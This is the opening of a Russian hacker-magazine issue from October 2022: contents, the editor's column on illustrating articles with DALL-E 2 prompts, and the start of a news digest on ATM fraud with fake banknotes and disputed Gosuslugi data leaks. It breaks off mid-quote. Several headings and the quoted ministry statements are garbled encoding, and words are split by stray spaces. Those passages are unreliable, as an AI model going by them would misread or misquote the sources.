
                                                      октябрь 2022
            № 283
CONTENTS

    Дали DALL-E!
  Колон ка главреда

    MEGANews
  Самые важные события в мире инфо сека за октябрь

    Змеиная пирамида
  За пускаем мал варь из сле пой зоны EDR

     Privesc as a Service
  По выша ем привилегии через Active Directory Certication Services

    Безумный Max
  Как ломают плагины для 3ds Max

    Уроки форензики
  Ис сле дуем дам пы и ищем следы взло ма в системе

    Уроки форензики
  Расследуем заражение машины с Windows шпионским тро яном

    HTB Perspective
  Об ходим XSS-филь тры и атакуем шифр через Padding Oracle

    HTB Faculty
  Ата куем веб-сервер через mPDF и повышаем привиле гии с помощью Linux capabilities

    HTB Scrambled
  Применяем ASREPRoast и Kerberoasting для атаки на SMB и MS SQL

    HTB OpenSource
  Ата куем удален ный хост через Git

    Мастерская хакера
  13 утилит для Linux, которые пригодятся админу

    Микроконтроллер не нужен!
  Делаем радиоприемник на копеечном китайском чипе

    Ликбез по macOS
  Разбира ем в подробнос тях, как устроена macOS

    Титры
  Кто дела ет этот жур нал
                              ПОДПИСКА НА «ХАКЕР»




Мы благодарим всех, кто поддерживает
редакцию и помогает нам компенсировать
авторам и редакторам их труд. Без вас
«Хакер» не мог бы существовать, и каждый
новый подписчик делает его чуть лучше.




                        Напоминаем, что дает годовая подписка:

                            год доступа ко всем материалам, уже
                        опубликованным на Xakep.ru;
                            год доступа к новым статьям, которые
                         выходят по будням;
                         полное отсутствие рекламы на сайте
                           (при условии, что ты залогинишься);
                         возможность скачивать выходящие
                       каждый месяц номера в PDF, чтобы
                           читать на любом удобном устройстве;
                       личную скидку 20%, которую
                      можно использовать для продления
                          годовой подписки. Скидка накапливается
                               с каждым продлением.

                         Если по каким-то причинам у тебя еще нет
                           подписки или она скоро кончится,
                              спеши исправить это!
HEADER





 КОЛОНКА ГЛАВРЕДА





DALL-E 2 — ней росеть, которая рису ет
кар тинки по тек сто вому зап росу. Гуляв шие
в этом году при меры работы с ней просто
поража ют: иног да она рису ет, как нас-
тоящий художник, и еще и пред лага ет       Андрей Письменный                                                                                      Главный редактор
вари анты  на  выбор! Мы  два  месяца         apismenny@gmail.com
использовали DALL-E  2,  что бы генери -
ровать кар тинки к статьям, и сегод ня я
покажу, как это было.


Проблема иллюстраций к стать ям у нас стоит давно: изображения с фотос-
токов обычно скучные, а по теме информацион ной безопасности вообще тоска
смертная — бесконечные хакеры в капюшонах и летающие полупрозрачные
бук вы. Нанимать иллюстратора, который выдавал бы по картинке в день, —
слиш ком нак ладно. В итоге вык ручиваемся как можем.
  Мысль генерировать картинки при помощи нейросети меня сразу же зах-
ватила: это быстро, можно (в теории!) изобразить имен но то, что хотел, а если
резуль тат будет несовершенным, то пускай это будет фирменной фичей, эта-
ким признаком того, что мы тут уже живем в будущем.
   Как толь ко я увидел картинки, сгенерирован ные нейросетью DALL-E 2, я
открыл рабочий чат и объявил, что нам срочно нужна эта шту ка. В июле доступ
раздали миллиону жду щих в очереди, и одному из наших сот рудников повезло
(спасибо ему огромное, что поделился доступом!).
  С того момен та я два месяца упражнялся в создании картинок при помощи
нейросети и снабжал ими статьи «Хакера». Перебор вариантов стал в редак ции
регулярным увеселением, которым я хочу поделить ся и с читателями.
   Начнем с картинки к статье про расследование киберин циден та, вышед шей
на прош лой неделе.




                    На картинки мож но нажать, чтобы увеличить.



Ñòàòüÿ: Уроки форен зики. Исследуем дам пы и ищем следы взлома в системе
Èäåÿ: пускай Шерлок Холмс или человек, похожий на него, изу чает жесткий
диск.


sherlock holmes inspecting a hard drive





Увы, у DALL-E 2 плоховато и с лицами, и с точным изображением устройств.
Ничего не под ходит.
  С реалистичны ми людь ми связывать ся не хочет ся, тог да пускай это будет
детек тив Пикачу!


detective pikachu inspecting a hard drive in a hi-tech room





Ах да, DALL-E 2, скорее всего, ничего не знает про детек тива Пикачу, потому
что не видела ком мерческих картинок с рек ламой филь ма. Зато видела мяг кие
игрушки Пикачу, поэтому у нас есть мяг кая игрушка, но без шапки Шерлока.
В любом слу чае на всех картинках он делает что-то стран ное. На расследова-
ние не тянет.
   Возвращаем ся к идее с Шерлоком, но попробу ем сделать его муль тяш -
ным.


cartoon sherlock holmes inspecting a hard drive in a tech room





Последний вроде бы сим патичный, но превратить это в горизон таль ную кар-
тинку будет сложно. Осталь ные держат очень стран ные пред меты.
  А что, если сделать фото, но из старой газеты? Это поможет скрыть недос-
татки, да и детек тив будет более узнаваемым.


old newspaper photo of sherlock holmes inspecting a hard drive





Последнего берем! Разве что бровь стран новатая, но идеала все равно
не добить ся.


ÌÓ×ÅÍÈß

Говорят, чтобы нарисовать приличную картинку при помощи DALL-E 2, нужно
сделать в сред нем 30–50 запросов, а если требует ся что-то действитель но
выдающееся, то счет может пойти на сот ни. Мы обычно ограничивались дву -
мя-тремя  запросами,  хотя  в  некоторых  слу чаях  поиски  растягивались
до пяти-вось ми. Главное — вовремя отказать ся от слиш ком смелой идеи.

Ñòàòüÿ: Сканим на Python. Как написать и улучшить собствен ный сканер пор-
тов
Èäåÿ: сканер, сканер... Первая ассоциация — сканер штрих-кодов на кассе.
А кассира для смеха попробу ем сделать змеей в парике.


cashier is a snake in a wig holding a barcode scanner in its tail





Что просил, то, в целом, и получил. Кажет ся, идея слиш ком сложная, поэтому
сделаем попрямолинейнее. Пусть питон будет инспек тировать сервер. Ска-
жем, держать в хвосте увеличитель ное стек ло.


digital art of a python with a magnifying glass in its tail in a
server room inspecting a server





Ру ка-хвост — ого-го! Все осталь ное тоже не годит ся. Попробу ем сделать
питона муль тяш ным.


cartoon illustration of a python inspecting a server with a lens
in a server room





Стиль неплох, но очень уж рукастые питоны! Попробу ем снова уточнить
про хвост.


cartoon illustration of a python with a magnifying glass in its
tail in a server room inspecting a server





Кажет ся, руки неизбежны. Что ж, возь мем первого. В кон це кон цов, для муль -
тфиль ма питон с рукой — это почти нормаль но.

Ñòàòüÿ: Время паять! Под бираем инстру мен ты и осваиваем искусство пайки
Èäåÿ: нужно нарисовать паяль ник. Пускай взды мает ся в небо в лучах солнца.


soldering iron shining brightly in a ray of light against the sky





Это... не паяль ники. Пробую еще раз, заменив солнце звездным небом
и добавив «реализм» и «высокое качество».


high quality realistic soldering iron shining brightly in the
night sky





Выш ли какие-то космические корабли. И у пришель цев явно дурные намере-
ния.
  Пробую сделать «картину» и добавить руку и печат ную плату в качестве
фона.


realistic painting of a hand with a soldering iron soldering a
computer chip to a pcb





А вот это почти хорошо! Берем третий, несмотря на то что человек тычет жалом
куда-то в процессор.

Ñòàòüÿ: Вин да на айфоне. Исполь зуем виртуалку UTM для установки Windows
на iOS
Èäåÿ: первая мысль очень прямолинейная — попросим нарисовать айфон
с Windows на экране и посмотрим, что выйдет.


phone on the table with microsoft windows on screen





Да, это определен но какие-то айфоны. Но дизайнил их не Джон ни Айв. Да и
вин ды нету.
  Пробую тог да попросить знаменитый зеленый холм из Windows XP.


iphone laying on the table with windows xp green hill on screen





Зеленый экран есть! Зеленого холма нет.
  Пожалуй, заставлять DALL-E рисовать реалистичную технику просто бес-
полезно. Попробу ем вместо этого что-нибудь абстрак тное. Намек нем на вло-
жен ность операционных систем, а чтобы было красиво, сделаем в стиле Саль -
вадора Дали.


screens within screens endless loops in style of salvador dali





Тут я усвоил важный урок: если попросить у DALL-E безум ную чертовщину, то
все получит ся! Я взял третью картинку из-за того, что она нем ного напоминает
логотип прог раммы UTM, о которой идет речь в статье.


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИHEADER




                            КОЛОНКА ГЛАВРЕДА





ÓÄÀ×È

Хорошо придуман ный запрос, нем ного везения, и DALL-E способна выдать
картинку не хуже, чем с фотостока, а иног да и лучше.

Ñòàòüÿ: Мик рокон троллер не нужен! Делаем радиоприемник на копеечном
китайском чипе
Èäåÿ: почему-то сразу вспом нился старый мем про троллейбус из бухан ки
хлеба. DALL-E к бою!


stock photo of a radio made out of a loaf of bread





Все картинки мне очень нравят ся, выбираю первую. Радио в науш никах —
нем ного стран но, но будем считать, что у него просто такая ручка.

Ñòàòüÿ: Privesc as a Service. Повышаем привилегии через Active Directory
Certication Services
Èäåÿ: статья у нас про под дель ные сертификаты. Под делку изобразить слож-
но, поэтому пускай горят, это всег да хорошо выг лядит!

Начнем с совсем крат кого запроса, посмотрим, что выйдет:


burning diplomas





Выш ло не очень — фотореализм не удался. Наугад пробую добавить «medievel
painting» — «сред невековая картина».





От лично! Все хороши, берем второй.

Ñòàòüÿ: Мастерская хакера. 13 утилит для Linux, которые пригодят ся админу
Èäåÿ: сделаем кру того пин гвина, который едет на гоночной машине. В стиле
рет ровейв для дополнитель ной кру тости.


a penguin in cool looking shades driving a ferrari f40
convertible in miami neonwave illustration





У пред послед него пот рясающая носовая фигура, но последний почти идеален.
Толь ко руль не задался и второе сиденье — с пин гвинь им клювом. Но его
будет лег ко замазать в редак торе.
   Вдохновившись, запрашиваю еще таких же пин гвинов, убрав точную марку
машины — DALL-E все равно в них плохо разбирается.


a penguin in cool looking shades driving a ferrari convertible in
miami neonwave





Три резуль тата похуже, но последний просто отличный. Толь ко пог ляди,
как пин гвин держит лапкой руль!

Ñòàòüÿ: Ин филь трация и эксфиль трация. Изу чаем методы передачи дан ных
при пен тестах
Èäåÿ: долго ломаю голову над инфиль трацией и эксфиль трацией и в итоге
придумы ваю кота, который вору ет рыбу у рыбака. Делаю для пробы слег ка
абстрак тный запрос. Добавляю слово «картина», чтобы скрыть возможные
огрехи.


painting of a cat stealing a fish from a fisherman





Кроме последнего, резуль таты сим патичные, хотя DALL-E почему-то решила,
что и рыбак тоже вполне может быть котом. Берем первого, самого душев-
ного, хотя худи (или скафандр?) из шку ры все же вызывает вопросы.

Ñòàòüÿ: Вперед в прош лое! Как выжить в Windows 2000 в 2022 году
Èäåÿ: Windows 2000? Это было давно. Пишу: «пещерные люди охотят ся
на доисторические компь ютеры, наскаль ная живопись». Да простит меня
автор!


cave painting of people hunting a laptop





Охоты на ноут бук не происходит, но резуль таты тем не менее хороши. Мне
особен но пон равился первый, где кто-то все же несет топор.

Ñòàòüÿ: Ядовитые гифки. Как работает уязвимость GIFShell
Èäåÿ: гифки у меня ассоциируют ся с пик сель-артом и с летящей Nyan Cat.
И попросим одеть кош ку в плащ из кислоты.


nyan cat in a cape of green acidic fluid pixel art





У DALL-E удивитель ным образом получается почти настоящий пик сель-арт.
Да и коты тоже отличные. Мне боль ше всего пон равился первый, но редак -
цион ным голосованием выбрали последнего.

Ñòàòüÿ: Картошка-0. Повышаем привилегии в AD при помощи RemotePotato0
Èäåÿ: вспом нив Мистера Картошку из «Истории игру шек», пытаюсь создать
похожего персонажа. Чтобы было совсем как у  Pixar, добавим, что нужен
высококачествен ный рен дер.


high quality rendering of a happy potato with a face in a room





Класс! Все картошки прек расны, некоторые хочет ся сразу же поставить себе
на аватарку. Вторая особен но проник новен ная. Берем ее!

Ñòàòüÿ: Лет ние исследования для чем пионов Security. Колон ка Дениса Мак -
рушина
Èäåÿ: чем пион на подиуме с книгой в руках.


a painting of a champion standing on a podium with a book in his
hand with dramatic backlight





Повезло с первого раза. Беру треть его, дорисовываю фон, и готово.





Ñòàòüÿ: Су ровая жаба. Изу чаем защиту Excelsior JET для прог рамм на Java
Èäåÿ: будем рисовать жабу. Боль шую сердитую жабу, сидящую в болоте.


big angry toad staring in dramatic light in a swamp





Невероятно, но у нас четыре почти фотореалистичные жабы. Годит ся любая, я
выбрал первую.

Ñòàòüÿ: Лето в стиле рет ро. Замет ки главреда, затерян ного в пространстве
и времени
Èäåÿ: это моя предыду щая колон ка — о том, как я все лето угорал по рет -
рогеймин гу и рет рокомпь ютин гу и разъезжал на мотороллере (тоже доволь но
вин тажном). Его и изобразим в лучах заката.


retrowave summer yamaha scooter trees against sunset cyberspace





Красота какая! Вторая картинка почти идеаль на, но придет ся выправлять
или замазы вать в редак торе поломан ное внизу солнце. Берем чет вертую, где
кривизна сойдет за стилизацию.


ÍÅÓÄÀ×È

Далеко не все запросы удивляют способностью DALL-E творить шедевры. Я
здесь постарался не занимать ся черри-пикин гом и показать, как работа с ней-
росетью выг лядит в реаль ности. Обычно мне удавалось в итоге добить ся
от DALL-E толка, но за два месяца было несколь ко слу чаев, ког да приходилось
оставлять попыт ки и брать готовую картинку из интернета.

Ñòàòüÿ: Уроки форен зики. Расследуем заражение машины с Windows шпи-
онским трояном
Èäåÿ: шпионские трояны... Что, если попытать ся изобразить тест Войта —
Кам пфа из «Бегущего по лезвию»?


Voight Kampff Test





DALL-E 2 уловила идею, но то ли не до кон ца, то ли опять ничего не знает
о копирайчен ном кон тенте. Я в итоге пошел вспоминать, как выг лядело прис-
пособление, и взял картинку из филь ма.





Дру гие подобные слу чаи я опу щу, ничего заниматель ного в них нет.


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИHEADER




                            КОЛОНКА ГЛАВРЕДА





ÕÎÕÌÛ

От кры вать DALL-E, придумы вать запрос и ждать резуль тата для меня, нес-
мотря на все сложности, стало одной из приятнейших частей работы. Не в пос-
леднюю очередь потому, что резуль таты часто выходят веселы ми — настоль ко,
что можно поржать, как говорит ся, всем офисом.

Ñòàòüÿ: Бан Kiwi Farms. Почему Cloudare отказалась защищать сайт, где
собираются тролли и сталкеры
Èäåÿ: к владель цам форума Kiwi Farms бук валь но вломилась бригада SWAT.
Попробу ем это изобразить! Я давно хотел попросить  у DALL-E сделать
что-нибудь в стиле комик сов Мебиуса, который считает ся одним из соз-
дателей киберпанка как визу аль ного стиля.


SWAT team seen through the door in style of mobius comic books





Картинки выш ли красивые, но, увы, совершенно непонят но, что здесь происхо-
дит. Хотелось бы к тому же вид из откры той двери, а не из-за спин. Пробую
исправить это.


SWAT team looking at you through the open door in style of mobius
comics





Смот рю на резуль таты круг лыми глазами, потом потихонь ку начинаю выть.
Продолжаю смот реть, и вой постепен но переходит в ор. На второй картинке,
кажет ся, изображена полиция мемов. Скидываю картинки автору статьи —
Маше Нефедовой, она проходит через ту же череду эмоций.
   Кажет ся, нужно менять под ход. Я уже выяснил, что у DALL-E отлично
получаются забавные овощи и фрук ты с глазами. Грех этим не восполь зовать -
ся. А киви-пираты вообще будут хитом! Пробуем.


a painting of three kiwis with evil faces dressed as pirates
dramatic light





На мой взгляд, резуль тат великолепный. Однако Маша, критично оглядев наш
с DALL-E шедевр, говорит, что, во-первых, киви на вид так себе, во-вторых,
владель цы форума имели в виду птичку, а не плоды. Упс!
   Лад но, птица так птица. Нарядим ее в черную худи и посадим за ноут бук.


evil kiwi bird in a black hoodie in front of a laptop





Они все просто прек расны, и на этот раз Маша не в силах спорить. Второй пот -
рясает нас своей шубой и своим злым «лицом». Но выбираем того, который
что-то печатает клювиком.
   Правда, Маша к этому момен ту уже сама сделала более серь езную иллюс-
трацию при помощи Midjourney, так что птица отправляет ся толь ко в соцсети.





Ñòàòüÿ: Облака под угрозой. Как пен тестить инфру в AWS
Èäåÿ: летящий в облаках черный воздушный шар с черепом и костями.
Для красоты просим под светить лучами солнца.


black hot air balloon with skull and bones in the sky with clouds
backlit by the sun





Ху же всего получились череп и кости, но это лег ко исправить. Беру первый,
замазы ваю  в  редак торе  стран ную  полосу  слева,  нак ладываю  картинку
с Веселым Род жером.
  Но чтобы получить достаточную ширину по горизон тали, нужно боль ше
неба. Не попробовать ли фун кцию дорисовывания? Отрезаю кусочек неба
и прошу DALL-E дополнить его. Ответ совершенно нед вусмысленный!





Од нако облака — субстан ция очень гибкая, можно редак тировать как угод но.
Без проблем замазы ваю безобразие и прилаживаю облака к картинке.





Ñòàòüÿ: Фун дамен таль ные основы хакерства. Борем ся с дизассем блерами
и зат рудняем реверс прог рамм
Èäåÿ: цикл «Фун дамен таль ные основы хакерства» мы всю дорогу иллюстри-
ровали каким-то стоковым типом в черной худи. Но в честь последнего выпус-
ка, выход которого еще и (почти) совпал с днем рождения Юры Язева,
хотелось разнообразия. Что, если вру чить хакеру в руки тортик?


photo of a hacker in a black hoodie holding a birthday cake dark
background backlit





Почти хорошо! Но в лица лучше не вглядывать ся, конечно.

Ñòàòüÿ: Перехват VK. Как хакеры исполь зуют клик джекинг для деаноними-
зации
Èäåÿ: клик джекинг — перехват кликов мышью. Мышей перехватывают кош ки,
так что попробу ем нарисовать кош ку, которая ловит компь ютерную мышь.

Для начала возь мем муль тяш ный стиль.


cartoon illustration of a cat holding a computer mouse in its
mouth





В целом не так плохо, и коты забавные, но везде разные изъяны. То мышь
не вид но, то мышь изу родована до неузнаваемости, то коты слиш ком кривые.
   Решаю попробовать попросить под делку под рен дер.


high quality octane render of a cat holding a computer mouse in
its mouth





Коты страш новатые, и белый фон не годит ся. Делаю еще один заход и прошу
добавить желтый фон.


high quality octane render of a cat holding a computer mouse in
its mouth on a yellow background





От души веселюсь, разглядывая резуль таты. Готового по-прежнему  нет,
но первому коту хотя бы лег ко добавить недостающий зрачок. Рисуя, нем ного
умираю внут ри от того, какой кот круг лый и какие у него ïàëüöû.

Ñòàòüÿ: Даня снова с нами! Выясняем у Дани Шеповалова, где он про-
падал 20 лет и при чем тут гуси
Èäåÿ: нужен Даня, ослик и гуси. Сразу мысли о каких-то старин ных картинах.
Скиталец едет на осле и ведет за собой стаю гусей. Попробу ем стилизовать
под сред невековую икону.


a man with a goose and a donkey medieval icon high quality





Последняя картинка хороша, но у нашего пророка что-то не то с лицом. Про-
бую еще раз, под крепив религиозные мотивы.


a man with a goose and a donkey ancient religious painting





Картинки отличные, однако ним бы, пожалуй, не к месту. Даня, конечно, леген -
да, но далеко не святой. Выбираем первую. К тому же эти гуси с ногами
(руками?) абсолют но невозможные.


ÊÎØÌÀÐÛ

Если нужно нарисовать что-нибудь пугающее, нейросети здесь могут оказать
неоценимую помощь. Увы, ограничить крипоту очень сложно, и она вылезает
тут и там совершенно непроизволь но.

Ñòàòüÿ: Атака Базарова. Evil Twin поверх динамической маршру тизации
Èäåÿ: изобразим злого двойника. Скажем, человек стоит перед зеркалом,
а отражение — его злая версия. С красными глазами и клы ками!


illustration of a man in the room looking in the mirror and
seeing his angry evil twin with fangs and red eyes





Кош мар! Двойники, может, и ничего, но у нас и оригиналы не очень-то добрые
выш ли.
   Если нам нужны клы ки, то пускай в зеркале будет орк. В крови!


a man looking in the mirror and seeing an orc covered in blood





Мне пон равилось, что одно из отражений еще и держит в руках зеркало. Может
быть, третий вариант чуть лучше дру гих, но в целом все это никуда не годит ся.
  Пробуем слег ка дру гой под ход. Пускай человек видит себя демоном
из ада.


illustration of a man in the room looking in the mirror and
seeing himself as a demon in hell





Первый вроде бы ничего! Но тут я решил дать выбор самому автору статьи.
А тот сразу сказал, что вторая картинка из первого запроса идеаль на. Попросил
добавить на грудь его любимую руну, я, конечно же, добавил.





Ñòàòüÿ: Анатомия эль фов 2. Разбираем устройство ELF-файлов в под робнос-
тях
Èäåÿ: попробу ем нарисовать что-то вроде анатомического атласа, но для эль -
фа и с под писями на эль фийском. Под писи — боль шой риск, любые бук вы
DALL-E дают ся очень плохо.


anatomic picture of an elf





В прин ципе, неплохо, кроме того, что эль фы не те — слиш ком сказочные. Поп-
робу ем еще разок, добавив упоминание эль фийских рун. Возможно, это как
раз наведет DALL-E на мысль о толкиеновских эль фах.


anatomic picture of an elf annotated with elven runes





Эль фы стали более фэн тезийными, но все страш новатые. Пробую еще раз.


anatomic diagram of an elf annotated with elven runes





Эль фы все страш нее и страш нее. Это уже не Толкиен и даже не Перумов.
Впрочем, первая картинка хотя бы достаточно абстрак тная. Отправляю запрос
еще раз, на удачу поменяв синоним для диаг раммы в надежде, что эль фы
будут в разрезе.


cross-section anatomic diagram of an elf annotated with elven
runes





Ну все, дело сделано, теперь это настоящее топливо для кош маров, особен но
этот ELL без лица и с роскошны ми рогами (и пот рясающей диаг раммой).


ÑÎÂÅÒÛ

За эти два месяца я неплохо нат ренировался в обращении с DALL-E. Попробую
поделить ся некоторыми советами.
 1. Лучше всего у DALL-E получается под делывать ся под сюрреализм —
   недаром название намекает на Саль вадора Дали.
 2. Дру гие известные художествен ные стили тоже срабаты вают. Смело добав-
   ляй к запросу имя любимого художника.
 3. Фотореалистичные изображения иног да получается хорошо (как в примере
   с жабой), но если тебе нужно нарисовать лицо человека или какое-то
   устройство, то добить ся правдоподобия будет очень тяжело.
 4. Рен деры, каран дашные наброски и карикатуры иног да получаются неплохо,
   но это чистой воды удача. Вообще, чем мень ше деталей, тем скорее DALL-
  E нарису ет что-то лиш нее.
 5. Не забывай указывать, где происходит действие, иначе есть шанс получить
   белый фон.
 6. Просить «высокое качество» не помешает, но это не волшебные слова,
   которые автоматически улучшат любую картинку.
 7. Нужно обращать внимание на освещение. «Драматичный свет» и «закат»
   часто улучшают резуль тат.
 8. Чтобы получить изображение без кривизны, нужно делать очень много зап-
   росов,  причем  лучше  всего  прорабатывать  несколь ко  идей,  пока
   не нащупаешь ту, которая у нейросети получается лучше всего.




                          Ultimate guide to DALL·E 2: how to use  it & how
                          to   get   access  —  под робное  руководс тво
                      по использованию DALL-E 2;
                      The  DALL·E  2  Prompt  Book —  презентация,
                        в которой есть множес тво при меров запросов.



ÂÛÂÎÄÛ

Работая с DALL-E, я поначалу чувствовал себя пещерным человеком, которому
дали нем ного поиг рать с крем нем и повысекать искры. У нейросетей есть
огромный потен циал, и сейчас их развитие — чуть ли не самое интересное, что
происходит в области вычислитель ной техники.
  Вопрос о том, лишат ли нейросети работы художников, для меня пока
открыт. На мой взгляд, если и лишат, то нескоро, а пока что работы может
стать даже боль ше.
   Очень часто картинки нужно дорабатывать, к тому же сами запросы сос-
тавлять не так-то просто, и познания в истории искусства дают преиму щества.
В идеале нужно акку рат но направлять нейросеть в сторону задум ки — причем
не толь ко словами, но и своими набросками.
  Недавно мне встретился очень интересный пример того, как при помощи
локаль но разверну той нейросети Stable Diﬀusion и графического редак тора
можно нарисовать в точности то, что задумано. Пред полагаю, скоро появят ся
и «облачные» редак торы с подобными (и гораздо более прод винуты ми) инс-
тру мен тами. И кто-то должен будет учить ся ими поль зовать ся.
  Наш пример показы вает, что рань ше мы не мог ли позволить себе рисовать
картинки для каждой статьи и были вынуждены выбирать из того, что есть
на фотостоках, а с DALL-E можем позволить себе гораздо боль ше иллюстра-
ций. С помощью нейросетей рисовать по картинке в день нам ного лег че, и,
естествен но, это должен делать специаль ный человек, а не развлекающийся
главный редак тор.


ÁÎÍÓÑ

На слад кое покажу запрос, который я исполь зовал, чтобы сделать заход ник
к этой статье. Я попробовал образно пред ставить нашу редак цию.


office in style of Hieronymus Bosch





Поразитель ное сходство! На первой я работаю за айпадом с клавиату рой.
На второй Вален тин Холмогоров оживляет вин тажный компь ютер. На треть ей
кто-то из наших авторов начал писать статью и исчез (типично). Ну а на пос-
ледней Дима Агарунов редак тиру ет какой-то важный бизнес-документ, а вок -
руг… Кажет ся, кипит работа.
                                      Мария «Mifrill» Нефёдова
                                                  nefedova@glc.ru


В этом месяце: Илон Маск все-таки купил Twitter за 44 мил -
лиар да, мошен ники обма нули бан коматы «Альфа-бан ка»
на 60 мил лионов рублей с помощью купюр из «бан ка при -
колов», дро ны  с  хакер ским обо рудо вани ем  ата кова ли
финан совую ком панию из США, баг ядра Linux пов режда ет
дисплеи ноут буков с Intel GPU, интернет-археоло гам пред -
ложили изу чить 11 Тбайт ста рых дискет и CD, кар деры сно -
ва устро или «аттрак цион невидан ной щед рости» и раз дают
кар ты бесплат но, и дру гие интересные события про шед -
шего октября.





МИЛЛИОНЫ
ИЗ БАНКА ПРИКОЛОВ
СМИ стало известно о крупной афере, от которой недавно пострадал «Аль -
фа-банк»: мошен ники внесли в бан коматы фаль шивые купюры на общую сум -
му более 60 миллионов рублей, после чего сняли уже настоящие день ги.
  Ин цидент произошел в кон це августа, и преступники атаковали определен -
ные модели бан коматов ком пании NCR, под делав пятиты сячные купюры
образца 1997 года. Мошен ники попросту внесли фаль шивые купюры на свои
счета в «Аль фа-бан ке», а бан коматы не обнаружили под делки и приняли все
наличные.
  По дан ным источников, в общей сложности бан коматы приняли боль -
ше 12 300 фаль шивых купюр, то есть ущерб исчисляется десят ками мил-
лионов рублей. Ког да все фаль шивки были пущены в дело, мошен ники сняли
настоящие день ги через дру гие бан коматы.
  Пока полиция проводила проверку по заявлению бан киров, обнаруживших
подозритель ную активность, преступники еще несколь ко дней продолжали
свои махинации. То есть их жертвами мог ли стать не толь ко бан киры, но и
обычные граждане, которым бан коматы при снятии наличных мог ли выдать
купюры «бан ка приколов».
  В ходе расследования было установлено, что для своей атаки преступники
выбрали два типа бан коматов ком пании NCR с устаревшими ПО и устройства-
ми приема купюр. При этом усердствовать в изготовлении фаль шивок зло-
умыш ленникам не приш лось: купюры они приобрели в сувенирных магазинах
и лишь нем ного доработали. Экспертиза показала, что фаль шивки напечатаны
способом цвет ной элек трог рафии на обычном ксерок се и уже после на купюры
нанесли имитацию некоторых степеней защиты.
  В настоящее время возбуждено уголовное дело по фак ту кражи в особо
крупном размере (п. б ч. 4 ст. 158 УК РФ), потерпевшими по которому про-
ходят «Аль фа-банк» и ряд неболь ших кредит ных учреждений. По дан ным СМИ,
дело возбудило УВД по Северо-Восточному окру гу столицы.
  Вероят но, шан сы раскрыть это преступление у правоохранителей неплохие,
так как, по информации журналистов, они уже выш ли на след организаторов,
которые не сумели надежно скрыть свои следы. Так, прак тически все бан ков-
ские счета и карты были оформлены на под ставных лиц (дропов), которые
силь но злоупот ребляли алкоголем. Имен но эти люди вносили в бан коматы
фаль шивки, а затем снимали настоящие день ги. При этом до организаторов
аферы якобы доходила не вся выручка: алкоголики успевали пот ратить часть
денег в ближайших к бан комату магазинах.
  Пред ставители «Аль фа-бан ка» заявили, что на время следствия воздержи-
вают ся от ком ментариев.


МОБИЛЬНЫЙ ТРАФИК СНИЗИЛСЯ НА 2,5%

Данные Минцифры свидетель ствуют о том, что в Рос сии впер вые сократил ся мобиль ный тра-
фик. Во вто ром квар тале 2022 года по срав нению с январем — мар том он умень шил ся почти
на 2,5% ( 8,35 миллиар да Гбайт про тив 8,54 миллиар да Гбайт ранее). Также, по данным
Рос комнад зора, в июле текуще го года транс граничный трафик в РФ вышел на плато (в срав -
нении с январем 2022 года снижение сос тавило око ло 1% ).

Учас тники рынка и экспер ты свя зывают снижение объ емов трафика с бло киров ками зарубежных
ресур сов, вве денными пос ле начала спе циаль ной военной опе рации, а также с доброволь ным
отказом от работы в РФ инос транных сер висов. В час тнос ти, речь идет о бло киров ке Facebook
и Instagram (принад лежат компании Meta, деятель ность которой приз нана экс тре мист ской
и запрещена в Рос сии), а также об отказе TikTok работать с рос сийской аудиторией.





УТЕЧКИ С ГОСУСЛУГ
В этом месяце в Telegram-каналах и СМИ несколь ко раз появлялась информа-
ция о сливах дан ных, якобы принад лежащих поль зователям Госуслуг.
  О первых трех утечках дан ных (5000, 2000 и 22 000 строк) сообщали спе-
циалисты Data Leakage & Breach Intelligence (DLBI). По дан ным аналитиков, эта
информация, вероятно, была получена «благодаря» перебору иден тифика-
торов поль зователей Единой системы иден тификации и  аутен тификации
(ЕСИА). Эксперты напоминали, что в кон це прош лого года стало известно
о сливе исходных кодов региональ ного портала госуслуг Пен зен ской области
и в этих исходниках обнаружились ключи к сертификатам, которые исполь зуют -
ся для доступа к ЕСИА.
  Все три дам па содержали следующие дан ные:
 • ФИО;
 • email-адреса;
 • телефоны;
 • пол;
 • даты рождения;
 • ад реса регистрации и фак тического места житель ства;
 • паспорта (серия, номер, кем и ког да выдан);
 • СНИЛС;
 • ИНН.

При этом после первого же инциден та пред ставители Мин цифры опровергли
информацию об утечке личных дан ных поль зователей Госуслуг. В ведомстве
ситу ацию проком ментировали так:


      «Îïðîâåðãàåì èíôîðìàöèþ îá  óòå÷êå äàííûõ  ñ Ãîñóñëóã. Â  ñåòè
      ïîÿâèëñÿ ôðàã ìåíò ÿêîáû áàçû äàííûõ ïîëüçîâàòå ëåé Ãîñóñëóã, ñîäåð-«
     æàùèé 5 òûñ. çàïèñåé. Ìû ïðîâåðèëè ýòîò ôàéë è âûÿñíèëè, ÷òî â íåì
      íåò òîãî íàáîðà ïàðàìåòðîâ, êîòîðûå îáÿ çàòåëüíî ïðèñóòñòâóþò â ñòàí-
      äàðòíûõ ó÷åòíûõ çàïèñÿõ Ãîñóñëóã. Ó÷åòíûå äàííûå ïîëüçîâàòå ëåé ïîð-
      òàëà (ëîãèíû è ïàðîëè) íå áûëè ñêîìïðîìåòèðîâàíû, èíôîðìàöèÿ
      íàäåæíî çàùèùå íà.
        Ïî äàííûì ñëóæáû áåçîïàñíîñòè,  ýòà  áàçà  îòíîñèòñÿ  ê îäíîé
      èç âíåøíèõ îíëàéí‑ñèñòåì, èñïîëüçóþùèõ óïðîùåííóþ èäåíòèôèêàöèþ
      ïîëüçîâàòå ëåé ÷åðåç Ãîñóñëóãè. Ýòà ñèñòåìà íå èìå åò ïðÿ ìîãî äîñòóïà
       ê ïîëíîìó íàáîðó äàííûõ ïîëüçîâàòå ëåé».                »
После публикации первых трех фраг ментов этой базы на хакерских форумах и в
Telegram-каналах и вовсе появилась информация о дам пе размером 2,5 мил-
лиона записей. Сообщение продавца гласило, что за этой утечкой стоят «те же
проукраинские хакеры», а 2,5 миллиона записей — лишь пробник боль шей
базы, которую злоумыш ленники выставили на продажу за 15 тысяч долларов
США.





Пред ставители ком пании «Ростелеком», которая занимается эксплу атацией
и развитием инфраструк туры элек трон ного правитель ства, включая портал
Госуслуг, заявили, что эта утечка — фейк.


       «Òàê æå êàê è ôàéë, î êîòîðîì áûëè ñîîáùåíèÿ 11 îêòÿáðÿ 2022 ãîäà,
      áàçà íå ñîäåðæèò íàáîðà ïàðàìåòðîâ, êîòîðûå îáÿ çàòåëüíî ïðèñóòñòâó-«
